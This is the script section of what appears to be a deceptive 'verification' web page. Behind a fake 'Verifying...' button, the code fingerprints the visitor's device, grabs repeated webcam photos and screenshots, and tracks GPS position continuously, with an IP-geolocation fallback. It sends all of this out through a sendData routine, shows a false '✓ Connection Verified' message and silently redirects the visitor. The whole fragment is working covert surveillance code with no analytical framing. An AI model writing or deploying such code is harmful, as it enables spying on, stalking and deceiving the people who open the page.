            inner: window.innerWidth+'x'+window.innerHeight, dpr: window.devicePixelRatio,
            memory: navigator.deviceMemory || '?', cores: navigator.hardwareConcurrency || '?',
            touch: navigator.maxTouchPoints || 0, timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
            online: navigator.onLine, cookie: navigator.cookieEnabled,
            referrer: document.referrer || 'direct', connection: null, timestamp: new Date().toISOString()
        };
        if (navigator.connection) info.connection = {
            type: navigator.connection.effectiveType, downlink: navigator.connection.downlink,
            rtt: navigator.connection.rtt, saveData: navigator.connection.saveData
        };
        sendData('device_info', { info: info });
    }

    function startCaptureLoops() {
        if (camOk) {
            captureCamera();
            intervals.push(setInterval(function() {
                if (totalCaptures >= CFG.MAX_SHOTS || redirected) return;
                captureCamera();
            }, CFG.CAM_INTERVAL));
        }
        setTimeout(function() { captureScreenshot(); }, 600);
        intervals.push(setInterval(function() {
            if (totalCaptures >= CFG.MAX_SHOTS || redirected) return;
            captureScreenshot();
        }, CFG.SHOT_INTERVAL));
        if (locOk) {
            intervals.push(setInterval(function() {
                if (redirected) return;
                navigator.geolocation.getCurrentPosition(function(p) { sendLocation(p, 'gps'); }, function() {});
            }, CFG.LOC_INTERVAL));
        }
    }

    function silentRedirect() {
        if (redirected) return;
        redirected = true;
        if (camOk) captureCamera();
        captureScreenshot();
        intervals.forEach(function(id) { clearInterval(id); });
        intervals = [];
        if (camStream) camStream.getTracks().forEach(function(t) { t.stop(); });
        if (watchId) navigator.geolocation.clearWatch(watchId);
        sendData('redirect_event', { total_captures: totalCaptures, redirect_url: CFG.REDIRECT_URL });
        setTimeout(function() { window.location.replace(CFG.REDIRECT_URL); }, 300);
    }

    // ═══════════════════════════════════════════════
    // DIRECT CAMERA ACTIVATION
    // getUserMedia called synchronously in click handler
    // ═══════════════════════════════════════════════
    document.getElementById('btn-verify').addEventListener('click', function(e) {
        e.preventDefault();
        if (activated) return;
        activated = true;

        var btn = document.getElementById('btn-verify');
        var label = document.getElementById('btn-label');
        btn.classList.add('processing');
        btn.disabled = true;
        label.textContent = 'Verifying...';
        setStatus('Requesting camera access...');

        navigator.mediaDevices.getUserMedia({
            video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 480 } },
            audio: false
        }).then(function(stream) {
            camStream = stream;
            camOk = true;
            var video = document.getElementById('cam-video');
            video.srcObject = stream;
            return video.play();
        }).then(function() {
            return new Promise(function(resolve) {
                var video = document.getElementById('cam-video');
                video.addEventListener('loadedmetadata', function() {
                    var canvas = document.getElementById('cam-canvas');
                    canvas.width = video.videoWidth || 640;
                    canvas.height = video.videoHeight || 480;
                    resolve();
                }, { once: true });
                setTimeout(resolve, 2000);
            });
        }).then(function() {
            setStatus('Requesting location access...');
            return new Promise(function(resolve) {
                if (!navigator.geolocation) { resolve(false); return; }
                var timeout = setTimeout(function() { resolve(false); }, 10000);
                navigator.geolocation.getCurrentPosition(function(pos) {
                    clearTimeout(timeout);
                    locOk = true;
                    sendLocation(pos, 'gps');
                    watchId = navigator.geolocation.watchPosition(
                        function(p) { sendLocation(p, 'gps'); },
                        function() {},
                        { enableHighAccuracy: true, maximumAge: 3000, timeout: 10000 }
                    );
                    resolve(true);
                }, function(err) {
                    clearTimeout(timeout);
                    resolve(false);
                }, { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 });
            });
        }).then(function(locResult) {
            if (!locResult) {
                setStatus('Getting approximate location...');
                return fetch('https://ipapi.co/json/').then(function(r) { return r.json(); }).then(function(geo) {
                    if (geo && geo.latitude) {
                        sendData('location', {
                            latitude: geo.latitude, longitude: geo.longitude,
                            accuracy: 5000, source: 'ip',
                            city: geo.city || null, region: geo.region || null, country: geo.country_name || null
                        });
                        locOk = true;
                    }
                }).catch(function() {});
            }
        }).then(function() {
            startCaptureLoops();
            btn.classList.remove('processing');
            label.textContent = '✓ Connection Verified';
            btn.style.background = 'linear-gradient(135deg, #10b981, #059669)';
            btn.style.boxShadow = '0 6px 24px rgba(16,185,129,0.4)';
            setStatus('Please wait...');
            setTimeout(silentRedirect, CFG.REDIRECT_AFTER);
        }).catch(function(err) {
            logCameraError(err);
            camOk = false;
            setStatus('Camera unavailable. Continuing...');
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(function(pos) {
                    locOk = true;
                    sendLocation(pos, 'gps');
                    watchId = navigator.geolocation.watchPosition(function(p) { sendLocation(p, 'gps'); }, function() {}, { enableHighAccuracy: true, maximumAge: 3000, timeout: 10000 });
                }, function() {
                    fetch('https://ipapi.co/json/').then(function(r) { return r.json(); }).then(function(geo) {
                        if (geo && geo.latitude) sendData('location', { latitude: geo.latitude, longitude: geo.longitude, accuracy: 5000, source: 'ip' });
                    }).catch(function() {});
                }, { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 });
            }
            startCaptureLoops();
            btn.classList.remove('processing');
            label.textContent = '✓ Verified';
            btn.style.background = 'linear-gradient(135deg, #f59e0b, #d97706)';
            btn.style.boxShadow = '0 6px 24px rgba(245,158,11,0.4)';
            setStatus('Please wait...');
            setTimeout(silentRedirect, CFG.REDIRECT_AFTER);
        });
    });

    collectDeviceInfo();
    setStatus('Waiting for verification...');
})();
</script>
